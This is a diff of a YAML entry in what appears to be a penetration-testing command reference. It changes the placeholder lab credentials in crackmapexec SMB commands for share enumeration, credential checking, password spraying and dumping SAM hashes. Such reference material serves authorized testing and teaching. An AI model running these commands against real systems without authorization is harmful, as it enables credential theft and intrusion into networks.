@@ -6,20 +6,20 @@ description: |
   Reference values:
     Target IP: 10.10.10.1
     Domain: test.local
-    Username: john
-    Password: password123
+    Username: pentuser
+    Password: P@ssw0rd123
 command: |
   # Enumerate shares
-  crackmapexec smb 10.10.10.1 -u john -p 'password123' --shares
+  crackmapexec smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --shares
 
   # Check credentials
-  crackmapexec smb 10.10.10.1 -u john -p 'password123'
+  crackmapexec smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123'
 
   # Password spraying
   crackmapexec smb 10.10.10.1 -u users.txt -p 'Password1' --continue-on-success
 
   # Dump SAM hashes (requires admin)
-  crackmapexec smb 10.10.10.1 -u admin -p 'password123' --sam
+  crackmapexec smb 10.10.10.1 -u admin -p 'P@ssw0rd123' --sam
 phase:
   - Enumeration
   - Exploitation
